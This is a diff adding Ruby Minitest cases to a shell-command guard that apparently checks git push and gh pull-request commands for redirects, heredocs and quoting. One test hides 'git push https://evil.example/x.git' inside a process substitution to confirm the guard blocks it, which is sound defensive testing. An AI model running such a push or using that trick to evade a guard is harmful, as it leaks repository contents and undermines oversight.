@@ -916,6 +916,46 @@ class ConsentGuardTest < Minitest::Test
     assert_equal(0, status.exitstatus, stderr)
   end
 
+  def test_a_process_substitution_does_not_hide_a_push_target
+    _, stderr, status = run_guard("cat <(git push https://evil.example/x.git main)")
+
+    assert_equal(2, status.exitstatus, stderr)
+  end
+
+  def test_an_ampersand_redirect_keeps_the_selector_before_it
+    stub_gh(view: "eirvandelden\tdotfiles\tabc123\tpr-only-via-finish", tree: "absent")
+
+    run_guard("gh pr merge 186&>/dev/null")
+
+    view = File.readlines(@gh_log).find { |line| line.start_with?("pr view") }
+    assert_includes(view, "pr view 186")
+  end
+
+  def test_an_unmatched_quote_does_not_bring_back_a_glued_redirect
+    start_change("pr-only-via-finish")
+
+    _, stderr, status = run_guard("cat <<X > n.txt\nit's\nX\ngh pr create>/dev/null")
+
+    assert_equal(2, status.exitstatus, stderr)
+  end
+
+  def test_every_create_window_is_read_for_a_head_flag
+    commit_change_then_leave_branch
+
+    _, stderr, status = run_guard("gh pr create --fill; gh pr create --head pr-only-via-finish")
+
+    assert_equal(2, status.exitstatus, stderr)
+  end
+
+  def test_a_quoted_redirect_target_is_not_the_merge_selector
+    stub_gh(view: "eirvandelden\tdotfiles\tabc123\tpr-only-via-finish", tree: "absent")
+
+    run_guard('gh pr merge --squash > "log.txt"')
+
+    view = File.readlines(@gh_log).find { |line| line.start_with?("pr view") }
+    refute_includes(view, "log.txt")
+  end
+
   def test_a_staged_but_uncommitted_removal_still_refuses_the_pull_request
     start_change("pr-only-via-finish")
     system("git", "-C", @repo, "-c", "core.hooksPath=/dev/null", "-c", "user.name=t", "-c", "user.email=t@t",
